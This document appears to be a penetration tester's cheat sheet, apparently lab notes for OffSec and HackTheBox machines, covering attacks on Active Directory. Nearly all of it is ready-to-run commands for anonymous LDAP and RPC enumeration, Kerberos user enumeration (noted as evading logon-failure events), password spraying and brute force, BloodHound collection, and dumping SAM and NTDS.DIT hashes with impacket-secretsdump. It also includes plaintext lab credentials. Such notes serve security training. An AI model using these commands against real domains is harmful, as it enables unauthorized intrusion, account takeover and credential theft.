### Enumeration
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: hutch.offsec0., Site: Default-First-Site-Name)
```
Extract all info under dn:
ldapsearch -x -H ldap://192.168.151.122 -D '' -w '' -b "DC=hutch,DC=offsec"

Extract description:
ldapsearch -x -H ldap://192.168.151.122 -D '' -w '' -b "DC=hutch,DC=offsec" | grep description

Extract domain password policy:
ldapsearch -x -H ldap://INLANEFREIGHT.LOCAL  -D '' -w '' -b "DC=INLANEFREIGHT,DC=LOCAL" | grep -m 1 -B 10 pwdHistoryLength

Extract naming context:
ldapsearch -H ldap://192.168.151.122 -x -s base namingcontexts

Extract all info:
ldapsearch -H ldap://10.10.11.187 -x -s base

Nmap auto enum:
nmap -n -sV --script "ldap* and not brute" <IP> #Using anonymous credentials

enum4linux -a -v ip
```
### User enumeration
kerbrute uses Kerberos authentication to test credentials against the DC  
Using kerbrute = nxc ldap ip -u '' -p '' -k
```
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```
This method doesn't generate Windows event ID 4625: An account failed to log on, but does generate event ID 4768: A Kerberos authentication ticket (TGT) was requested
```
enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
```
```
rpcclient -U "" -N 172.16.5.5
enumdomusers
```
```
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "
ldapsearch -x -H ldap://192.168.151.122 -D '' -w '' -b "DC=hutch,DC=offsec" | grep sAMAccountName
```
### PasswordSpray
```
./kerbrute_linux_amd64 passwordspray --dc 10.10.11.60 -d frizz.htb userlist "Welcome1!" -v
```
### Password Brute-force
```
./kerbrute bruteuser --dc 10.10.11.60 -d frizz.htb pass_file M.SchoolBus -v
```
### If you have valid credentials to login into the LDAP server, you can dump all the information about the Domain Admin using:
```
pip3 install ldapdomaindump 
ldapdomaindump <IP> [-r <IP>] -u '<domain>\<username>' -p '<password>' [--authtype SIMPLE] --no-json --no-grep [-o /path/dir]
```
```
If you find something saying that the "bind must be completed" means that the credentials are incorrect.

You can extract everything from a domain using:

Copy
ldapsearch -x -H ldap://10.10.10.192 -b "DC=BLACKFIELD,DC=local" -D 'support@blackfield.local' -w '#00^BlackKnight'
-x Simple Authentication
-H LDAP Server
-D My User
-w My password
-b Base site, all data from here will be given
```
### Brute-force
```
nmap --script ldap-brute -p 389 <IP>
```
### Domain Info 
```
bloodhound-python -ns 192.168.219.21 -d nagoya-industries.com -u 'Fiona.Clark' -p 'Summer2023' -c all
sudo proxychains4 -f /etc/proxychains4.conf bloodhound-python -ns 10.10.179.140 -d oscp.exam -u 'web_svc' -p 'Diamond1' -c all --dns-tcp
```
### DCSyn
```
impacket-secretsdump -sam SAM(local SAM file) -system SYSTEM(local SYSTEM file) local
impacket-secretsdump celia.almeda:7k8XHk3dMtmpnC7@10.10.96.142 -sam SAM -system SYSTEM -outputfile /home/kali/Desktop/admin_hash.txt
impacket-secretsdump celia.almeda@10.10.96.142 -sam SAM -system SYSTEM -outputfile /home/kali/Desktop/admin_hash.txt -hashes lm:nt

NTDS.DIT Secrets and Kerberos Key:
impacket-secretsdump 'htb.local'/'venom':'newP@ssword2022'@10.10.10.161
```
